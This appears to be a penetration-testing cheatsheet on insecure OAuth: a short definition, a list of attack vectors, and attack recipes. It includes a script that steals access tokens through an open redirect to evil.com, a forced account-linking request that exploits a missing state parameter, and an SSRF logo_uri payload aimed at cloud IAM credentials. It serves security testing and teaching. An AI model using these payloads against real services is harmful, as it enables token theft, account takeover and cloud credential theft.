---
title: Insecure OAuth
description: Insecure OAuth cheatsheet
---

# Insecure OAuth

## Definition

OAuth (Open Authorization) is a protocol that allows a user to grant third-party access to their resources without sharing their credentials. It is commonly used as a means of secure authentication and authorization for web applications, APIs, and other online services.

There are several potential attack vectors associated with OAuth, including:

- Phishing attacks: Attackers may try to trick users into granting access to their resources by disguising themselves as a legitimate OAuth provider and presenting a fake login or authorization prompt.
- Access token leakage: If an access token is leaked or stolen, an attacker may be able to gain unauthorized access to the protected resources. This can occur if the token is stored insecurely or transmitted over an unencrypted connection.
- Misuse of the authorization grant: Attackers may try to abuse the authorization grant by using it to access resources that were not intended to be shared, or by using the grant to perform actions that the user did not authorize.
- Resource owner impersonation: An attacker may try to impersonate the resource owner and gain access to their resources by manipulating the OAuth authorization process.
- Client impersonation: An attacker may try to impersonate a legitimate OAuth client and gain access to protected resources on behalf of the client.

To protect against these types of attacks, it is important to implement OAuth in a secure manner and to educate users about the potential risks associated with granting third-party access to their resources.

## Attacks

- Get valid token, and change username on auth request which goes to the client application, ex `POST /authenticate`
- Exploit redirect_uri to steal access token (whitelist bypass by exploiting an OpenRedirect on the client application)

```javascript
<script>
if (!document.location.hash) {
    window.location = 'https://example.com/auth?client_id=CLIENT_ID&redirect_uri=https://example.com/oauth-callback/../post/next?path=https://evil.com/&response_type=token&nonce=399721827&scope=openid%20profile%20email';
} else {
    window.location = '/?'+btoa(document.location);
}
</script>
```

- No state, force linking, `GET /oauth-linking?code=G6yRLEh0waXxTON0Xm5rLXC3dWScTqvn1Wd964vuvTR` drop request & send this to the victim, it will link OAuth your account to their main account
- Extract openID info `GET /.well-known/openid-configuration`, create a client register with logo `"logo_uri":"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"`, then dump logo `GET /client/<client_id>/logo`